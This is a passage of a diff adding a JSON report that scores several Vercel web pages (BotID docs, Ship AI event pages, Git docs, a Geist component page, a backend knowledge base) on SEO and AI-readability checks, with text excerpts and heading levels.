+          5,
+          5,
+          5,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          1,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          2,
+          3,
+          2,
+          3,
+          2,
+          2,
+          2,
+          2,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2
+        ]
+      },
+      "pageType": "other"
+    },
+    {
+      "url": "https://vercel.com/docs/botid",
+      "score": 88,
+      "maxScore": 112,
+      "summary": "Decent base, but key machine-readable signals are missing.",
+      "checks": [
+        {
+          "id": "title",
+          "label": "Clear page title",
+          "passed": false,
+          "points": 10,
+          "details": "Found title (5 chars)."
+        },
+        {
+          "id": "meta-description",
+          "label": "Meta description",
+          "passed": true,
+          "points": 10,
+          "details": "Found description (116 chars)."
+        },
+        {
+          "id": "canonical",
+          "label": "Canonical URL",
+          "passed": true,
+          "points": 8,
+          "details": "Canonical: https://vercel.com/docs/botid"
+        },
+        {
+          "id": "h1",
+          "label": "Single H1 heading",
+          "passed": true,
+          "points": 8,
+          "details": "Found 1 h1 tag(s)."
+        },
+        {
+          "id": "schema",
+          "label": "Structured data present",
+          "passed": true,
+          "points": 8,
+          "details": "Found 3 JSON-LD block(s)."
+        },
+        {
+          "id": "schema-types",
+          "label": "Schema types identified",
+          "passed": true,
+          "points": 8,
+          "details": "Types: WebSite, BreadcrumbList"
+        },
+        {
+          "id": "og",
+          "label": "Open Graph basics",
+          "passed": true,
+          "points": 8,
+          "details": "og:title and og:description found."
+        },
+        {
+          "id": "internal-links",
+          "label": "Internal linking",
+          "passed": true,
+          "points": 10,
+          "details": "Found 211 internal links."
+        },
+        {
+          "id": "image-alt",
+          "label": "Image alt coverage",
+          "passed": false,
+          "points": 8,
+          "details": "2/3 images include alt text."
+        },
+        {
+          "id": "text-depth",
+          "label": "Readable content depth",
+          "passed": true,
+          "points": 12,
+          "details": "Estimated 1079 words in body text."
+        },
+        {
+          "id": "indexability",
+          "label": "Indexable for discovery",
+          "passed": true,
+          "points": 10,
+          "details": "No noindex directive found."
+        },
+        {
+          "id": "ai-meta-tags",
+          "label": "AI-accessible meta tags",
+          "passed": true,
+          "points": 6,
+          "details": "No restrictive AI meta tags."
+        },
+        {
+          "id": "heading-hierarchy",
+          "label": "Content structure",
+          "passed": false,
+          "points": 6,
+          "details": "Heading levels skipped — weakens the content outline AI agents use for extraction."
+        }
+      ],
+      "aiView": {
+        "title": "BotID",
+        "metaDescription": "Protect your applications from automated attacks with intelligent bot detection and verification, powered by Kasada.",
+        "h1": [
+          "BotID"
+        ],
+        "h1Count": 1,
+        "headings": [
+          "Build with AI",
+          "Deploy &amp; scale",
+          "Operate &amp; protect",
+          "Resources",
+          "Resources",
+          "Validation flow",
+          "Check levels",
+          "Basic",
+          "Deep Analysis",
+          "Pricing",
+          "Bypassing BotID",
+          "BotID observability",
+          "More resources",
+          "On this page",
+          "Agent Stack",
+          "Core Platform"
+        ],
+        "jsonLdCount": 3,
+        "schemaTypes": [
+          "WebSite",
+          "TechArticle",
+          "BreadcrumbList"
+        ],
+        "jsonLdSummary": "@type=WebSite | name=Vercel Documentation | publisher=Vercel Inc.\n@type=TechArticle | author=Vercel | dateModified=2026-06-16T16:30:47. | description=Protect your applications from automated attacks with intelligent bot detection and verification, po\n@type=BreadcrumbList",
+        "internalLinkCount": 211,
+        "textExcerpt": "Copy page Copy page BotID Copy page Copy page BotID is available on all plans Vercel BotID is an invisible CAPTCHA that protects against sophisticated bots without showing visible challenges or requiring user action. It's a client-side challenge that uses machine learning to distinguish between humans and bots. It adds a protection layer to high-value routes, such as checkouts, signups, and APIs, that are common targets for bots imitating real users. Sophisticated bots are designed to closely mimic real user behavior. They can run JavaScript, solve CAPTCHAs, and navigate interfaces in ways that closely resemble humans. Tools like Playwright and Puppeteer automate these sessions, simulating actions from page load to form submission. These bots aim to blend in with normal traffic, making detection difficult and mitigation costly. Resources Getting Started - Setup guide with complete code examples Verified Bots - Information about verified bots and their handling Bypass BotID - Configure bypass rules for BotID detection View our BotID Next.js starter template Get Started Open in v0 Validation flow BotID validates clients with these steps: A client-side challenge is sent to the browser. The browser solves the challenge and includes the solution in requests to your high-value endpoint. Your server-side code calls checkBotId() Vercel validates the integrity of the challenge response. Deep Analysis uses a machine learning model to analyze the client side signals, if configured. The server-side code receives the analysis result, where the application can take action. Check levels BotID can be configured to run at one of two levels, Basic or Deep Analysis . Deep Analysis runs only after the Basic validation has passed. Basic The Basic level validates the integrity and correctness of the challenge response, catching many less sophisticated bots. It is provided free of charge for all plans. Deep Analysis BotID includes Deep Analysis , powered by Kasada . Kasada is a leading bo",
+        "bodyWordCount": 1079,
+        "publishedDate": "",
+        "modifiedDate": "",
+        "author": "",
+        "aiMetaTags": [],
+        "hasNoindex": false,
+        "canonical": "https://vercel.com/docs/botid",
+        "hasOg": true,
+        "imgCount": 3,
+        "imgsWithAlt": 2,
+        "headingLevels": [
+          5,
+          5,
+          5,
+          5,
+          3,
+          3,
+          3,
+          3,
+          1,
+          3,
+          2,
+          2,
+          3,
+          3,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2
+        ]
+      },
+      "pageType": "docs"
+    },
+    {
+      "url": "https://vercel.com/ship/ai",
+      "score": 80,
+      "maxScore": 112,
+      "summary": "Decent base, but key machine-readable signals are missing.",
+      "checks": [
+        {
+          "id": "title",
+          "label": "Clear page title",
+          "passed": true,
+          "points": 10,
+          "details": "Found title (12 chars)."
+        },
+        {
+          "id": "meta-description",
+          "label": "Meta description",
+          "passed": false,
+          "points": 10,
+          "details": "Found description (37 chars)."
+        },
+        {
+          "id": "canonical",
+          "label": "Canonical URL",
+          "passed": true,
+          "points": 8,
+          "details": "Canonical: https://vercel.com/ship/ai"
+        },
+        {
+          "id": "h1",
+          "label": "Single H1 heading",
+          "passed": true,
+          "points": 8,
+          "details": "Found 1 h1 tag(s)."
+        },
+        {
+          "id": "schema",
+          "label": "Structured data present",
+          "passed": false,
+          "points": 8,
+          "details": "No JSON-LD structured data found."
+        },
+        {
+          "id": "schema-types",
+          "label": "Schema types identified",
+          "passed": false,
+          "points": 8,
+          "details": "No recognized @type found in JSON-LD."
+        },
+        {
+          "id": "og",
+          "label": "Open Graph basics",
+          "passed": true,
+          "points": 8,
+          "details": "og:title and og:description found."
+        },
+        {
+          "id": "internal-links",
+          "label": "Internal linking",
+          "passed": true,
+          "points": 10,
+          "details": "Found 36 internal links."
+        },
+        {
+          "id": "image-alt",
+          "label": "Image alt coverage",
+          "passed": true,
+          "points": 8,
+          "details": "105/109 images include alt text."
+        },
+        {
+          "id": "text-depth",
+          "label": "Readable content depth",
+          "passed": true,
+          "points": 12,
+          "details": "Estimated 494 words in body text."
+        },
+        {
+          "id": "indexability",
+          "label": "Indexable for discovery",
+          "passed": true,
+          "points": 10,
+          "details": "No noindex directive found."
+        },
+        {
+          "id": "ai-meta-tags",
+          "label": "AI-accessible meta tags",
+          "passed": true,
+          "points": 6,
+          "details": "No restrictive AI meta tags."
+        },
+        {
+          "id": "heading-hierarchy",
+          "label": "Content structure",
+          "passed": false,
+          "points": 6,
+          "details": "Only one heading level used — content lacks topic segmentation for AI chunking."
+        }
+      ],
+      "aiView": {
+        "title": "Ship AI 2025",
+        "metaDescription": "Join us in SF or online on October 23",
+        "h1": [
+          "Ship AI 2025"
+        ],
+        "h1Count": 1,
+        "headings": [],
+        "jsonLdCount": 0,
+        "schemaTypes": [],
+        "jsonLdSummary": "",
+        "internalLinkCount": 36,
+        "textExcerpt": "Ship AI 2025 The conference for builders shipping the future of AI Book a demo Ship an agent Sessions Title Speakers Rethinking the future of digital transactions Rethinking the future of digital transactions Jeanne Grosser (COO, Vercel) Kate Jensen (Head of Sales and Partnerships, Anthropic) Arjun Rajeswaran (Product Staff, Databricks) Jeff Weinstein (Product Lead, Stripe) An introduction to the Workflow Development Kit An introduction to the Workflow Development Kit Subham Pramanik (Engineering Lead, Mandolin) Pranay Prakash (Tech Lead, Vercel) BotID: The web's protection layer BotID: The web's protection layer Minqi Chen (Software Engineer, Yupp) Andrew Qu (Software Engineer, Office of CTO, Vercel) Raf Garcia (Co-Founder, Kernel) From Alpha to Action: How AISDK5 Helped Us Build an AI-Native CRM From Alpha to Action: How AISDK5 Helped Us Build an AI-Native CRM Jack Reed (Co-founder, Lightfield) Nikita Butakov (Founding Engineer, Lightfield) What's happening in AI with Baseten and Conviction What's happening in AI with Baseten and Conviction Tuhin Srivastava (CEO, Baseten) Sarah Guo (Founder, Conviction) Vercel AI gateway: You can just use AI Vercel AI gateway: You can just use AI Osama Khan (CPTO, Durable) Daniel Swiecki (Head of Current - AI Solutions, Walleye Capital) Merrill Lutsky (CEO, Graphite) Harpreet Arora (Product Lead, Vercel) Understanding multi-modal generative visual AI Understanding multi-modal generative visual AI Andreas Blattmann (Co-Founder, Black Forest Labs) Agents at Work Agents at Work Matt Lewis (Senior Partner Solutions Engineer, Vercel) Panel: Building the Agentic Ecosystem for developers Panel: Building the Agentic Ecosystem for developers Ankur Goyal (Founder, Braintrust) Harjot Gill (CEO, CodeRabbit) Hedi Zandi (Product manager, Vercel) Demo: Building the Agentic Ecosystem for Developers Demo: Building the Agentic Ecosystem for Developers Hedi Zandi (Product manager, Vercel) Joey Malysz (Sr Manager, Partner Programs, Operations & Marke",
+        "bodyWordCount": 494,
+        "publishedDate": "",
+        "modifiedDate": "",
+        "author": "",
+        "aiMetaTags": [],
+        "hasNoindex": false,
+        "canonical": "https://vercel.com/ship/ai",
+        "hasOg": true,
+        "imgCount": 109,
+        "imgsWithAlt": 105,
+        "headingLevels": [
+          1
+        ]
+      },
+      "pageType": "other"
+    },
+    {
+      "url": "https://vercel.com/docs/git",
+      "score": 104,
+      "maxScore": 112,
+      "summary": "Strong for AI agents. Improve a few weak signals to harden performance.",
+      "checks": [
+        {
+          "id": "title",
+          "label": "Clear page title",
+          "passed": true,
+          "points": 10,
+          "details": "Found title (38 chars)."
+        },
+        {
+          "id": "meta-description",
+          "label": "Meta description",
+          "passed": true,
+          "points": 10,
+          "details": "Found description (146 chars)."
+        },
+        {
+          "id": "canonical",
+          "label": "Canonical URL",
+          "passed": true,
+          "points": 8,
+          "details": "Canonical: https://vercel.com/docs/git"
+        },
+        {
+          "id": "h1",
+          "label": "Single H1 heading",
+          "passed": true,
+          "points": 8,
+          "details": "Found 1 h1 tag(s)."
+        },
+        {
+          "id": "schema",
+          "label": "Structured data present",
+          "passed": true,
+          "points": 8,
+          "details": "Found 3 JSON-LD block(s)."
+        },
+        {
+          "id": "schema-types",
+          "label": "Schema types identified",
+          "passed": true,
+          "points": 8,
+          "details": "Types: WebSite, BreadcrumbList"
+        },
+        {
+          "id": "og",
+          "label": "Open Graph basics",
+          "passed": true,
+          "points": 8,
+          "details": "og:title and og:description found."
+        },
+        {
+          "id": "internal-links",
+          "label": "Internal linking",
+          "passed": true,
+          "points": 10,
+          "details": "Found 239 internal links."
+        },
+        {
+          "id": "image-alt",
+          "label": "Image alt coverage",
+          "passed": false,
+          "points": 8,
+          "details": "2/5 images include alt text."
+        },
+        {
+          "id": "text-depth",
+          "label": "Readable content depth",
+          "passed": true,
+          "points": 12,
+          "details": "Estimated 2016 words in body text."
+        },
+        {
+          "id": "indexability",
+          "label": "Indexable for discovery",
+          "passed": true,
+          "points": 10,
+          "details": "No noindex directive found."
+        },
+        {
+          "id": "ai-meta-tags",
+          "label": "AI-accessible meta tags",
+          "passed": true,
+          "points": 6,
+          "details": "No restrictive AI meta tags."
+        },
+        {
+          "id": "heading-hierarchy",
+          "label": "Content structure",
+          "passed": true,
+          "points": 6,
+          "details": "Clean heading structure (4 levels) — easy for AI agents to chunk and cite."
+        }
+      ],
+      "aiView": {
+        "title": "Deploying Git Repositories with Vercel",
+        "metaDescription": "Vercel allows for automatic deployments on every branch push and merges onto the production branch of your GitHub, GitLab, and Bitbucket projects.",
+        "h1": [
+          "Deploying Git Repositories with Vercel"
+        ],
+        "h1Count": 1,
+        "headings": [
+          "Build with AI",
+          "Deploy &amp; scale",
+          "Operate &amp; protect",
+          "Resources",
+          "Supported Git Providers",
+          "Self-Hosted examples",
+          "Deploying a Git repository",
+          "Creating a deployment from a Git reference",
+          "Deploying private Git repositories",
+          "Using Pro teams",
+          "Using Hobby teams",
+          "Deploying forks of public Git repositories",
+          "Production branch",
+          "Default configuration",
+          "Customizing the production branch",
+          "Preview branches"
+        ],
+        "jsonLdCount": 3,
+        "schemaTypes": [
+          "WebSite",
+          "TechArticle",
+          "BreadcrumbList"
+        ],
+        "jsonLdSummary": "@type=WebSite | name=Vercel Documentation | publisher=Vercel Inc.\n@type=TechArticle | author=Vercel | dateModified=2026-06-16T16:30:47. | description=Vercel allows for automatic deployments on every branch push and merges onto the production branch o\n@type=BreadcrumbList",
+        "internalLinkCount": 239,
+        "textExcerpt": "Copy page Copy page Deploying Git Repositories with Vercel Copy page Copy page Vercel allows for automatic deployments on every branch push and merges onto the production branch of your GitHub , GitLab , Bitbucket and Azure DevOps Pipelines projects. Using Git with Vercel provides the following benefits: Preview deployments for every push. Production deployments for the most recent changes from the production branch . Instant rollbacks when reverting changes assigned to a custom domain. When working with Git, have a branch that works as your production branch, often called main . After you create a pull request (PR) to that branch, Vercel creates a unique deployment you can use to preview any changes. Once you are happy with the changes, you can merge your PR into the main branch, and Vercel will create a production deployment. You can choose to use a different branch as the production branch . Supported Git Providers GitHub Free GitHub Team GitHub Enterprise Cloud GitLab Free GitLab Premium GitLab Ultimate GitLab Enterprise Bitbucket Free Bitbucket Standard Bitbucket Premium Azure DevOps Pipelines Self-Hosted examples GitHub Enterprise Server Self-Managed GitLab Bitbucket Data Center (Self-Hosted) If your provider is not listed here, you can also use the Vercel CLI to deploy with any git provider. Deploying a Git repository Setting up your GitHub, GitLab, or Bitbucket repository on Vercel is only a matter of clicking the \"New Project\" button on the top right of your dashboard and following the steps. For Azure DevOps repositories, use the Vercel Deployment Extension After clicking it, you'll be presented with a list of Git repositories that the Git account you've signed up with has write access to. To select a different Git namespace or provider, you can use the dropdown list on the top left of the section. A list of Git repositories your Git account has access to. You can also import a third-party Git repository . After you've selected the Git repository or templa",
+        "bodyWordCount": 2016,
+        "publishedDate": "",
+        "modifiedDate": "",
+        "author": "",
+        "aiMetaTags": [],
+        "hasNoindex": false,
+        "canonical": "https://vercel.com/docs/git",
+        "hasOg": true,
+        "imgCount": 5,
+        "imgsWithAlt": 2,
+        "headingLevels": [
+          5,
+          5,
+          5,
+          5,
+          3,
+          3,
+          3,
+          3,
+          1,
+          2,
+          3,
+          2,
+          3,
+          2,
+          3,
+          3,
+          2,
+          2,
+          3,
+          3,
+          2,
+          3,
+          3,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2
+        ]
+      },
+      "pageType": "docs"
+    },
+    {
+      "url": "https://vercel.com/ship",
+      "score": 60,
+      "maxScore": 112,
+      "summary": "Needs work. AI agents may miss context or trust signals.",
+      "checks": [
+        {
+          "id": "title",
+          "label": "Clear page title",
+          "passed": true,
+          "points": 10,
+          "details": "Found title (14 chars)."
+        },
+        {
+          "id": "meta-description",
+          "label": "Meta description",
+          "passed": false,
+          "points": 10,
+          "details": "Found description (46 chars)."
+        },
+        {
+          "id": "canonical",
+          "label": "Canonical URL",
+          "passed": true,
+          "points": 8,
+          "details": "Canonical: https://vercel.com/ship"
+        },
+        {
+          "id": "h1",
+          "label": "Single H1 heading",
+          "passed": false,
+          "points": 8,
+          "details": "Found 0 h1 tag(s)."
+        },
+        {
+          "id": "schema",
+          "label": "Structured data present",
+          "passed": false,
+          "points": 8,
+          "details": "No JSON-LD structured data found."
+        },
+        {
+          "id": "schema-types",
+          "label": "Schema types identified",
+          "passed": false,
+          "points": 8,
+          "details": "No recognized @type found in JSON-LD."
+        },
+        {
+          "id": "og",
+          "label": "Open Graph basics",
+          "passed": true,
+          "points": 8,
+          "details": "og:title and og:description found."
+        },
+        {
+          "id": "internal-links",
+          "label": "Internal linking",
+          "passed": true,
+          "points": 10,
+          "details": "Found 5 internal links."
+        },
+        {
+          "id": "image-alt",
+          "label": "Image alt coverage",
+          "passed": true,
+          "points": 8,
+          "details": "No images on page."
+        },
+        {
+          "id": "text-depth",
+          "label": "Readable content depth",
+          "passed": false,
+          "points": 12,
+          "details": "Estimated 27 words in body text."
+        },
+        {
+          "id": "indexability",
+          "label": "Indexable for discovery",
+          "passed": true,
+          "points": 10,
+          "details": "No noindex directive found."
+        },
+        {
+          "id": "ai-meta-tags",
+          "label": "AI-accessible meta tags",
+          "passed": true,
+          "points": 6,
+          "details": "No restrictive AI meta tags."
+        },
+        {
+          "id": "heading-hierarchy",
+          "label": "Content structure",
+          "passed": false,
+          "points": 6,
+          "details": "No headings found — AI agents have no structural anchors to chunk content."
+        }
+      ],
+      "aiView": {
+        "title": "Vercel Ship 26",
+        "metaDescription": "Build, deploy, and scale agents. Get a ticket.",
+        "h1": [],
+        "h1Count": 0,
+        "headings": [],
+        "jsonLdCount": 0,
+        "schemaTypes": [],
+        "jsonLdSummary": "",
+        "internalLinkCount": 5,
+        "textExcerpt": "",
+        "bodyWordCount": 27,
+        "publishedDate": "",
+        "modifiedDate": "",
+        "author": "",
+        "aiMetaTags": [],
+        "hasNoindex": false,
+        "canonical": "https://vercel.com/ship",
+        "hasOg": true,
+        "imgCount": 0,
+        "imgsWithAlt": 0,
+        "headingLevels": []
+      },
+      "pageType": "other"
+    },
+    {
+      "url": "https://vercel.com/geist/note",
+      "score": 78,
+      "maxScore": 112,
+      "summary": "Decent base, but key machine-readable signals are missing.",
+      "checks": [
+        {
+          "id": "title",
+          "label": "Clear page title",
+          "passed": false,
+          "points": 10,
+          "details": "Found title (4 chars)."
+        },
+        {
+          "id": "meta-description",
+          "label": "Meta description",
+          "passed": true,
+          "points": 10,
+          "details": "Found description (72 chars)."
+        },
+        {
+          "id": "canonical",
+          "label": "Canonical URL",
+          "passed": true,
+          "points": 8,
+          "details": "Canonical: https://vercel.com/geist/note"
+        },
+        {
+          "id": "h1",
+          "label": "Single H1 heading",
+          "passed": true,
+          "points": 8,
+          "details": "Found 1 h1 tag(s)."
+        },
+        {
+          "id": "schema",
+          "label": "Structured data present",
+          "passed": false,
+          "points": 8,
+          "details": "No JSON-LD structured data found."
+        },
+        {
+          "id": "schema-types",
+          "label": "Schema types identified",
+          "passed": false,
+          "points": 8,
+          "details": "No recognized @type found in JSON-LD."
+        },
+        {
+          "id": "og",
+          "label": "Open Graph basics",
+          "passed": true,
+          "points": 8,
+          "details": "og:title and og:description found."
+        },
+        {
+          "id": "internal-links",
+          "label": "Internal linking",
+          "passed": true,
+          "points": 10,
+          "details": "Found 98 internal links."
+        },
+        {
+          "id": "image-alt",
+          "label": "Image alt coverage",
+          "passed": false,
+          "points": 8,
+          "details": "6/18 images include alt text."
+        },
+        {
+          "id": "text-depth",
+          "label": "Readable content depth",
+          "passed": true,
+          "points": 12,
+          "details": "Estimated 4495 words in body text."
+        },
+        {
+          "id": "indexability",
+          "label": "Indexable for discovery",
+          "passed": true,
+          "points": 10,
+          "details": "No noindex directive found."
+        },
+        {
+          "id": "ai-meta-tags",
+          "label": "AI-accessible meta tags",
+          "passed": true,
+          "points": 6,
+          "details": "No restrictive AI meta tags."
+        },
+        {
+          "id": "heading-hierarchy",
+          "label": "Content structure",
+          "passed": true,
+          "points": 6,
+          "details": "Clean heading structure (3 levels) — easy for AI agents to chunk and cite."
+        }
+      ],
+      "aiView": {
+        "title": "Note",
+        "metaDescription": "Display text that requires attention or provides additional information.",
+        "h1": [
+          "Note"
+        ],
+        "h1Count": 1,
+        "headings": [
+          "Default",
+          "Action",
+          "Success",
+          "Error",
+          "Warning",
+          "Secondary",
+          "Violet",
+          "Cyan",
+          "Disabled",
+          "Labels",
+          "Default label",
+          "Custom label",
+          "No label",
+          "Best Practices",
+          "When to use",
+          "Behavior"
+        ],
+        "jsonLdCount": 0,
+        "schemaTypes": [],
+        "jsonLdSummary": "",
+        "internalLinkCount": 98,
+        "textExcerpt": "Note Display text that requires attention or provides additional information. Default A small note. A default note. A large note. Show code Action This note details some information. Upgrade This note details a large amount information that could potentially wrap into two or more lines, forcing the height of the Note to be larger. Upgrade Show code Success This note details some success information. This note details some success information. Upgrade This note details some success information. Check the documentation to learn more. Upgrade This filled note details some success information. This filled note details some success information. Upgrade This filled note details some success information. Check the documentation to learn more. Upgrade Show code Error This note details some error information. This note details some error information. Upgrade This note details some success information. Check the documentation to learn more. Upgrade This filled note details some error information. This filled note details some error information. Upgrade This filled note details some success information. Check the documentation to learn more. Upgrade Show code Warning This note details some warning information. This note details some warning information. Upgrade This note details some success information. Check the documentation to learn more. Upgrade This filled note details some warning information. This filled note details some warning information. Upgrade This filled note details some success information. Check the documentation to learn more. Upgrade Show code Secondary This note details some secondary information. This note details some secondary information. Upgrade This note details some success information. Check the documentation to learn more. Upgrade This filled note details some secondary information. This filled note details some secondary information. Upgrade This filled note details some success information. Check the documentation to learn more. Upgrade Show co",
+        "bodyWordCount": 4495,
+        "publishedDate": "",
+        "modifiedDate": "",
+        "author": "",
+        "aiMetaTags": [],
+        "hasNoindex": false,
+        "canonical": "https://vercel.com/geist/note",
+        "hasOg": true,
+        "imgCount": 18,
+        "imgsWithAlt": 6,
+        "headingLevels": [
+          1,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          3,
+          3,
+          3,
+          2,
+          3,
+          3,
+          3
+        ]
+      },
+      "pageType": "other"
+    },
+    {
+      "url": "https://vercel.com/kb/backend",
+      "score": 88,
+      "maxScore": 112,
+      "summary": "Decent base, but key machine-readable signals are missing.",
+      "checks": [
+        {
+          "id": "title",
+          "label": "Clear page title",
+          "passed": true,
+          "points": 10,
+          "details": "Found title (31 chars)."
+        },
+        {
+          "id": "meta-description",
+          "label": "Meta description",
+          "passed": true,
+          "points": 10,
+          "details": "Found description (250 chars)."
+        },
+        {
+          "id": "canonical",
+          "label": "Canonical URL",
+          "passed": true,
+          "points": 8,
+          "details": "Canonical: https://vercel.com/kb/backend"
+        },
+        {
+          "id": "h1",
+          "label": "Single H1 heading",
+          "passed": true,
+          "points": 8,
+          "details": "Found 1 h1 tag(s)."
+        },
+        {
+          "id": "schema",
+          "label": "Structured data present",
+          "passed": false,
+          "points": 8,
+          "details": "No JSON-LD structured data found."
+        },
+        {
+          "id": "schema-types",
+          "label": "Schema types identified",
+          "passed": false,
+          "points": 8,
+          "details": "No recognized @type found in JSON-LD."
+        },
+        {
+          "id": "og",
+          "label": "Open Graph basics",
+          "passed": true,
+          "points": 8,
+          "details": "og:title and og:description found."
+        },
+        {
+          "id": "internal-links",
+          "label": "Internal linking",
+          "passed": true,
+          "points": 10,
+          "details": "Found 182 internal links."
+        },
+        {
+          "id": "image-alt",
+          "label": "Image alt coverage",
+          "passed": false,
+          "points": 8,
+          "details": "2/35 images include alt text."
+        },
+        {
+          "id": "text-depth",
+          "label": "Readable content depth",
+          "passed": true,
+          "points": 12,
+          "details": "Estimated 1060 words in body text."
+        },
+        {
+          "id": "indexability",
+          "label": "Indexable for discovery",
+          "passed": true,
+          "points": 10,
+          "details": "No noindex directive found."
+        },
+        {
+          "id": "ai-meta-tags",
+          "label": "AI-accessible meta tags",
+          "passed": true,
+          "points": 6,
+          "details": "No restrictive AI meta tags."
+        },
+        {
+          "id": "heading-hierarchy",
+          "label": "Content structure",
+          "passed": true,
+          "points": 6,
+          "details": "Clean heading structure (4 levels) — easy for AI agents to chunk and cite."
+        }
+      ],
+      "aiView": {
+        "title": "Backend | Vercel Knowledge Base",
+        "metaDescription": "Backends deployed to Vercel get the full benefit of Vercel's infrastructure: Fluid compute with dynamic scaling and cold-start prevention, Active CPU pricing, Instant Rollback, the Vercel Firewall, protected preview deployments, and rolling releases.",
+        "h1": [
+          "Backend"
+        ],
+        "h1Count": 1,
+        "headings": [
+          "Build with AI",
+          "Deploy &amp; scale",
+          "Operate &amp; protect",
+          "Resources",
+          "Build with a Backend Template on Vercel",
+          "Build with a Nitro starter template",
+          "Build with a Hono starter template",
+          "Build with an Express starter template",
+          "Build with a FastAPI starter template",
+          "Build with a Flask starter template",
+          "Zero-Configuration Backends on Vercel",
+          "Using xmcp with Next.js",
+          "How to ship an H3 app on Vercel",
+          "How to ship a Fastify app on Vercel",
+          "How to ship an Express app on Vercel",
+          "How to ship a FastAPI app on Vercel"
+        ],
+        "jsonLdCount": 0,
+        "schemaTypes": [],
+        "jsonLdSummary": "",
+        "internalLinkCount": 182,
+        "textExcerpt": "Backend Backends deployed to Vercel get the full benefit of Vercel's infrastructure: Fluid compute with dynamic scaling and cold-start prevention, Active CPU pricing, Instant Rollback, the Vercel Firewall, protected preview deployments, and rolling releases. Back to Knowledge Base Build with a Backend Template on Vercel Build with a Nitro starter template Deploy a Nitro app to Vercel from a starter template. Compare the Nitro Starter, route rules, cached HTTP handler, plugins, Slack Bolt, and iMessage AI agent templates, then ship to a live URL. Build with a Hono starter template Deploy a Hono app to Vercel from a starter template. Compare the Hono API starter, MCP server, AI SDK, Slack Bolt, Next.js, Turborepo, and domco templates, then ship to a live URL. Build with an Express starter template Deploy an Express app to Vercel from a template. Browse Express starters from Vercel and the community, then run them locally with the Vercel CLI. Build with a FastAPI starter template Browse FastAPI starter templates for Vercel and deploy one in a few steps. Compare minimal, AI, agent, and full-stack FastAPI templates on the Python runtime. Build with a Flask starter template Deploy a Flask app to Vercel from a starter template. Compare the Flask Hello World starter, AI SDK, alt text generator, and Next.js templates, then ship to a live URL. Zero-Configuration Backends on Vercel Using xmcp with Next.js Add an MCP server to an existing Next.js app with xmcp. Create typed tools, add authentication, and deploy to Vercel as a Vercel Function. How to ship an H3 app on Vercel Deploy an H3 app to Vercel with zero configuration. Learn to configure streaming, middleware, cron jobs, the Bun runtime, and observability. How to ship a Fastify app on Vercel Deploy a Fastify app to Vercel with zero configuration, then add streaming, lifecycle hooks, cron jobs, and observability. How to ship an Express app on Vercel Deploy an Express app to Vercel with zero configuration. Configure respons",
+        "bodyWordCount": 1060,
+        "publishedDate": "",
+        "modifiedDate": "",
+        "author": "",
+        "aiMetaTags": [],
+        "hasNoindex": false,
+        "canonical": "https://vercel.com/kb/backend",
+        "hasOg": true,
+        "imgCount": 35,
+        "imgsWithAlt": 2,
+        "headingLevels": [
+          5,
+          5,
+          5,
+          5,
+          3,
+          3,
+          3,
+          3,
+          1,
+          2,
+          3,
+          3,
+          3,
+          3,
+          3,
+          2,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2
+        ]
+      },
+      "pageType": "other"
+    }
+  ]
+}
